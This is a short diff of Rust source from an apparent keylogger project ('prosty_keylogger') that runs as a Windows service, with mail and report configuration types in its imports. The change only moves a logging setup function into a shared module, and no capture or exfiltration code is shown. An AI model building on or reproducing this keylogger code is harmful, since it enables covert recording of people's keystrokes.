@@ -20,30 +20,12 @@ use serde_json::value::Index;
 use windows_service::{define_windows_service, service_control_handler, service_dispatcher};
 use windows_service::service::{ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType};
 use windows_service::service_control_handler::ServiceControlHandlerResult;
-use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, TaskConfiguration};
+use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, setup_logger, TaskConfiguration};
 use crate::options::ClientArgs;
 //CoreVirtualKeyStates
 
 //pub const BUFF_SIZE: usize = 1024*128;
-fn setup_logger(level: LevelFilter, path: Option<impl AsRef<Path>>) -> Result<(), fern::InitError> {
-    let mut d = fern::Dispatch::new()
-        .format(|out, message, record| {
-            out.finish(format_args!(
-                "[{} {} {}] {}",
-                humantime::format_rfc3339_seconds(SystemTime::now()),
-                record.level(),
-                record.target(),
-                message
-            ))
-        })
-        .level(level);
-        if let Some(p) = path{
-            d = d.chain(fern::log_file(p)?);
-        }
-        d.chain(std::io::stdout())
-        .apply()?;
-    Ok(())
-}
+
 
 #[inline]
 pub fn check_key() -> Vec<u8>{
